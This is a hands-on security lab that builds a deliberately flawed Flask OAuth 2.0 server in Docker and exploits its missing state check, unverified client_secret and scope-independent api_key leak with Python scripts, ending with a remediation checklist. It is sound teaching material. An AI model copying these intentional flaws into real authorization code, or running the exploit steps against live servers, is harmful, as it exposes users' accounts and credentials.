# Lab 10: OAuth 2.0 Attack Chain

## Objective

Exploit three OAuth 2.0 implementation flaws in a live authorization server from Kali Linux:

1. **Missing `state` parameter** — no CSRF protection on the OAuth flow; attacker can force-bind their own OAuth account to a victim's account
2. **`client_secret` not verified** — exchange an authorization code without providing the correct client secret
3. **Excessive data exposure via access token** — the userinfo endpoint returns `api_key` regardless of the requested scope

---

## Background

OAuth 2.0 is the authorization framework underlying "Login with Google/GitHub/Facebook" across millions of sites. Implementation flaws are ubiquitous because the spec leaves many details to implementors.

**Real-world examples:**
- **2014 "Covert Redirect" (Wang Jing)** — open redirect in OAuth `redirect_uri` combined with missing `state` check; attacker could capture authorization codes from legitimate users.
- **2018 Facebook Access Token Exposure** — "View As" feature leaked access tokens via a video upload OAuth flow; 50M accounts affected.
- **2021 Expo (React Native) OAuth** — missing `state` check in the Expo SDK OAuth helper; attacker could force-associate their credentials with any victim account by tricking them into clicking a crafted OAuth link.
- **2023 Microsoft Azure AD** — authorization code exchange didn't validate `redirect_uri` at the token endpoint; code could be exchanged from any redirect target.

**OWASP:** A01:2021 (Broken Access Control), A07:2021 (Auth Failures)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv10                        │
│  ┌──────────────────────┐  Crafted OAuth flows (no state/secret)  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3           │  ◀──────── access token + api_key leaked  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask OAuth Authorization Server   │  │
│                             │  GET  /api/oauth/authorize          │  │
│                             │  POST /api/oauth/token              │  │
│                             │  GET  /api/oauth/userinfo           │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv10

cat > /tmp/victim_adv10.py << 'PYEOF'
from flask import Flask, request, jsonify
import secrets, time

app = Flask(__name__)
AUTH_CODES = {}
ACCESS_TOKENS = {}
CLIENTS = {'myapp': {'secret':'correct-secret','redirect_uris':['http://victim-adv10:5000/callback']}}
USERS = {
    'alice': {'role':'user','email':'alice@innoz.com','api_key':'alice-secret-key'},
    'admin': {'role':'admin','email':'admin@innoz.com','api_key':'admin-super-secret'},
}

@app.route('/api/oauth/authorize')
def authorize():
    client_id = request.args.get('client_id','')
    redirect_uri = request.args.get('redirect_uri','')
    state = request.args.get('state','')
    scope = request.args.get('scope','read')
    user  = request.args.get('user','alice')  # simulates logged-in user
    client = CLIENTS.get(client_id)
    if not client: return jsonify({'error':'Unknown client'}),400
    # BUG: state not required and not validated server-side
    code = secrets.token_hex(8)
    AUTH_CODES[code] = {'client_id':client_id,'user':user,'scope':scope,'redirect_uri':redirect_uri,'ts':time.time()}
    return jsonify({'auth_code':code,'redirect_to':f"{redirect_uri}?code={code}&state={state}",
                    'state_received':state,'warning':'State not validated server-side'})

@app.route('/api/oauth/token', methods=['POST'])
def token():
    d = request.get_json() or {}
    code = d.get('code','')
    client_id = d.get('client_id','')
    # BUG: client_secret not checked
    auth = AUTH_CODES.get(code)
    if not auth or auth['client_id'] != client_id:
        return jsonify({'error':'Invalid code'}),400
    del AUTH_CODES[code]
    tok = secrets.token_hex(16)
    ACCESS_TOKENS[tok] = {'user':auth['user'],'scope':auth['scope'],'ts':time.time()}
    return jsonify({'access_token':tok,'token_type':'Bearer','scope':auth['scope'],
                    'note':'client_secret was NOT verified!'})

@app.route('/api/oauth/userinfo')
def userinfo():
    auth = request.headers.get('Authorization','')
    if not auth.startswith('Bearer '): return jsonify({'error':'No token'}),401
    info = ACCESS_TOKENS.get(auth[7:])
    if not info: return jsonify({'error':'Invalid token'}),401
    user = USERS.get(info['user'],{})
    return jsonify({'user':info['user'],'scope':info['scope'],
                    'email':user.get('email'),'role':user.get('role'),
                    'api_key':user.get('api_key'),  # BUG: always returned
                    'note':'api_key returned regardless of scope'})

@app.route('/callback')
def callback():
    return jsonify({'code':request.args.get('code'),'state':request.args.get('state'),
                    'next':'POST /api/oauth/token with this code'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv10 --network lab-adv10 \
  -v /tmp/victim_adv10.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv10.IPAddress}}' victim-adv10):5000/"
```

---

### Step 2: Launch Kali + Understand Normal OAuth Flow

```bash
docker run --rm -it --name kali --network lab-adv10 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv10:5000"

python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv10:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())
def get(path, h={}):
    req = urllib.request.Request(f"{T}{path}", headers=h)
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Normal OAuth 2.0 flow:")
print()
print("  Step 1: User clicks 'Login with InnoZverse'")
print("  Step 2: Browser → GET /api/oauth/authorize?client_id=myapp&state=RANDOM")
state = "csrf-protection-token-abc123"
r1 = get(f"/api/oauth/authorize?client_id=myapp&redirect_uri=http://victim-adv10:5000/callback&scope=read&state={state}&user=alice")
print(f"  authorize response: code={r1['auth_code']}  state_received={r1['state_received']}")
print(f"  ⚠ Warning: {r1['warning']}")
print()
print("  Step 3: Callback receives code + state")
print("  Step 4: Exchange code for token (WITH client_secret)")
r2 = post("/api/oauth/token", {"code":r1['auth_code'],"client_id":"myapp","client_secret":"correct-secret"})
print(f"  token: {r2['access_token'][:30]}...  note: {r2['note']}")
print()
print("  Step 5: Use token to get user info")
r3 = get("/api/oauth/userinfo", {"Authorization":f"Bearer {r2['access_token']}"})
print(f"  userinfo: {r3}")
EOF
```

---

### Step 3: Attack 1 — Missing State (CSRF on OAuth)

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv10:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())
def get(path, h={}):
    req = urllib.request.Request(f"{T}{path}", headers=h)
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Attack 1: Missing state parameter — OAuth CSRF")
print()
print("    Attack scenario:")
print("    1. Attacker initiates OAuth flow for THEIR OWN account")
print("    2. Captures the authorization code before exchanging it")
print("    3. Sends victim a crafted link: /callback?code=ATTACKER_CODE")
print("    4. Victim's browser submits the code — server links ATTACKER account to VICTIM session")
print("    5. Attacker can now log in as victim via their own credentials")
print()

# Attacker initiates flow with NO state
r1 = get("/api/oauth/authorize?client_id=myapp&redirect_uri=http://victim-adv10:5000/callback&scope=read&user=admin")
# No state parameter — no CSRF protection
code = r1['auth_code']
state_received = r1['state_received']

print(f"    Attacker's auth code: {code}")
print(f"    State received: '{state_received}'  ← EMPTY — no CSRF token issued")
print()

# Exchange without client_secret
r2 = post("/api/oauth/token", {"code": code, "client_id": "myapp"})
token = r2['access_token']
print(f"    Token obtained: {token[:30]}...")
print(f"    Server note: {r2['note']}")
print()

# Use token to access admin resources
r3 = get("/api/oauth/userinfo", {"Authorization": f"Bearer {token}"})
print(f"[!] Admin access: {r3}")
EOF
```

**📸 Verified Output:**
```
    Attacker's auth code: b4d8797c312a241e
    State received: ''  ← EMPTY — no CSRF token issued

    Token obtained: 28e2d57e34dac316f6d4...
    Server note: client_secret was NOT verified!

[!] Admin access: {'api_key': 'admin-super-secret', 'email': 'admin@innoz.com', 'role': 'admin', ...}
```

---

### Step 4: Attack 2 — client_secret Not Verified

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv10:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())
def get(path, h={}):
    req = urllib.request.Request(f"{T}{path}", headers=h)
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Attack 2: client_secret bypass — code exchange without secret")
print()

# Get a fresh code
r1 = get("/api/oauth/authorize?client_id=myapp&redirect_uri=http://victim-adv10:5000/callback&scope=read&user=alice")
code = r1['auth_code']

tests = [
    ("No secret at all",       {"code":code,"client_id":"myapp"}),
    ("Wrong secret",           {"code":code+"_new","client_id":"myapp"}),
]

# Get new codes for each test
for name, payload in tests:
    r_auth = get("/api/oauth/authorize?client_id=myapp&redirect_uri=http://victim-adv10:5000/callback&scope=read&user=alice")
    payload["code"] = r_auth["auth_code"]
    try:
        r2 = post("/api/oauth/token", payload)
        print(f"  {name}: {'SUCCESS — token=' + r2.get('access_token','')[:20] + '...' if 'access_token' in r2 else 'FAILED: ' + r2.get('error','')}")
    except Exception as e:
        print(f"  {name}: ERROR {e}")

print()
print("[!] Any public client (e.g. a mobile app) can exchange codes without the secret")
print("    This allows code interception attacks to succeed without needing the secret")
print("    Fix: require PKCE (Proof Key for Code Exchange) for public clients")
EOF
```

---

### Step 5: Attack 3 — Excessive Data Exposure

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv10:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())
def get(path, h={}):
    req = urllib.request.Request(f"{T}{path}", headers=h)
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Attack 3: Excessive data exposure via userinfo endpoint")
print()

scopes_to_test = ['read', 'profile', 'email', 'openid']

for scope in scopes_to_test:
    r1 = get(f"/api/oauth/authorize?client_id=myapp&redirect_uri=http://victim-adv10:5000/callback&scope={scope}&user=alice")
    r2 = post("/api/oauth/token", {"code":r1['auth_code'],"client_id":"myapp"})
    r3 = get("/api/oauth/userinfo", {"Authorization":f"Bearer {r2['access_token']}"})
    print(f"  scope={scope:<10} → api_key returned: {r3.get('api_key','NOT PRESENT')}")

print()
print("[!] api_key is returned for ALL scopes including minimal 'read'")
print("    The api_key field should only be returned for scope='credentials' or similar")
print("    Principle: return the minimum data needed for the requested scope")
EOF
```

**📸 Verified Output:**
```
  scope=read       → api_key returned: alice-secret-key
  scope=profile    → api_key returned: alice-secret-key
  scope=email      → api_key returned: alice-secret-key
  scope=openid     → api_key returned: alice-secret-key

[!] api_key is returned for ALL scopes
```

---

### Steps 6–8: Full Attack Chain + Remediation + Cleanup

```bash
python3 << 'EOF'
print("[*] Secure OAuth 2.0 implementation checklist:")
checklist = [
    ("state parameter",     "Generate cryptographically random state; verify on callback before exchanging code"),
    ("PKCE",               "Use code_challenge/code_verifier for public clients instead of client_secret"),
    ("redirect_uri strict","Exact string match against pre-registered URIs; reject substrings and wildcards"),
    ("client_secret",      "Require for confidential clients; use PKCE for public (mobile/SPA) clients"),
    ("token expiry",       "Short-lived access tokens (15min); refresh tokens rotated on each use"),
    ("scope enforcement",  "Return only fields relevant to the granted scope; api_key needs explicit scope"),
    ("code single-use",    "Delete auth code on first use; reject replays"),
]
for item, fix in checklist:
    print(f"  {item:<22} → {fix}")
EOF
exit
```

```bash
docker rm -f victim-adv10
docker network rm lab-adv10
```

---

## Further Reading
- [OAuth 2.0 Security Best Practices (RFC 9700)](https://datatracker.ietf.org/doc/rfc9700/)
- [PortSwigger OAuth Attacks](https://portswigger.net/web-security/oauth)
- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html)
